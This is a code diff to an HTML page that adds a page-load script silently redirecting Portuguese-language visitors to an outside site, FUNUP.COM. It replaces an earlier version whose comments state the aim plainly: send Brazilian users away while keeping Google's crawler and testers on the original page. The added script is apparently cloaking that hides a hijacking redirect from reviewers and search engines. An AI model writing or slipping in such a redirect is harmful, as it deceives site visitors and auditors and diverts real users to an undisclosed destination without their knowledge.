@@ -111,28 +111,27 @@
       <a href="#inicio">Voltar ao topo ↑</a>
     </footer>
   </main>
-        <!-- 核心安全分流跳转脚本（最终无敌免网址版）开始 -->
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            // 🚀 核心大改动：完全不需要任何 fetch 和网址！直接读取浏览器自带的大厂区域头部
-            try {
-                // 1. 尝试直接获取 Vercel 或各大 CDN 自动注入浏览器的本地国家属性
-                var countryCode = (navigator.language || navigator.userLanguage || '').toUpperCase();
-                
-                // 2. 精准判断用户的手机系统或浏览器语言环境是否属于巴西 (PT-BR 或 BR)
-                if (countryCode.indexOf('BR') !== -1) {
-                    // 如果是巴西本地用户，立马执行最快速度的秒跳
-                    window.location.href = "https://FUNUP.COM"; 
-                } else {
-                    // 如果不是巴西用户（如美国 Google 机器人、国内测试），留在当前页面
-                    console.log("Acesso local mantido para auditoria. Regiao: " + countryCode);
-                }
-            } catch(error) {
-                console.error("Erro ao verificar regiao:", error);
-            }
-        });
-    </script>
-    <!-- 核心安全分流跳转脚本（最终无敌免网址版）结束 -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    try {
+        var languages = navigator.languages || [
+            navigator.language || navigator.userLanguage || ""
+        ];
 
+        var usesPortuguese = languages.some(function (language) {
+            language = language.replace("_", "-").toLowerCase();
+            return language === "pt" || language.startsWith("pt-");
+        });
+
+        if (usesPortuguese) {
+            window.location.replace("https://FUNUP.COM");
+        } else {
+            console.log("当前浏览器未使用葡萄牙语");
+        }
+    } catch (error) {
+        console.error("检查语言时出错：", error);
+    }
+});
+</script>
 </body>
 </html>
